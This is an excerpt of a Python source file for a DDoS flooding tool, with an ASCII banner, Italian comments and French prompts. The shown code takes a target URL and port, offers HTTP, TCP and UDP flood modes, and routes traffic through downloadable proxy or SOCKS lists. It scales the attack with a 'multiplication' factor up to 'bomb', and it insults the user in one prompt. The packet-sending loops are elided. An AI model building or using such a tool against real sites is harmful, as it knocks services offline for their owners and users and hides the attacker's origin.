...
_____ __ __    __ __  _ _____  ___  ____    ___ 
|     |  |  |  /  |  |/ |     |/   \|    \  /  _]
|   __|   |  | /  /|  ' /|__/  |     |  _  |/  [_ 
|  |_ |  |  |/  / |    \|   __|  O  |  |  |    _]
|   _]|  :  /   \_|     |  /  |     |  |  |   [_ 
|  |  |     \     |  .  |     |     |  |  |     |
|__|   \__,_|\____|__|\_|_____|\___/|__|__|_____|
                                                 

							C0d3d by OldPianoVersion
	''') # la grafica ci sta
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	url = input("\nCopie ton url ici: ").strip()

	if url == "":
		print ("Ton url fils de pute")
		starturl()
...
def floodmode(): # la scelta della modalità di attacco
	global choice1
	choice1 = input("Tu veux utiliser HTTP flood clique sur '0', TCP flood '1' Ou UDP flood '2' ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
...
def floodport():
	global port
	try:
		port = int(input("Tu veux flood quelle port ?: "))
...
def proxymode():
	global choice2
	choice2 = input("Tu veux utiliser les proxy ou les socks fait 'Y' puis enter ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("tape '0' pour le mode proxy ou tape '1' pour le mode socks: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Tu veux dl ma list de proxy ? fait 'y' puis enter: ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("Tu veux dl ma list de socks ? fait 'y' puis enter:: ")
	if choice4 == "y":
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Tape le nombre de multuplication du flood [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Appuye sur 'Enter' pour lancer: ")
	if choice6 == "":
		loop()
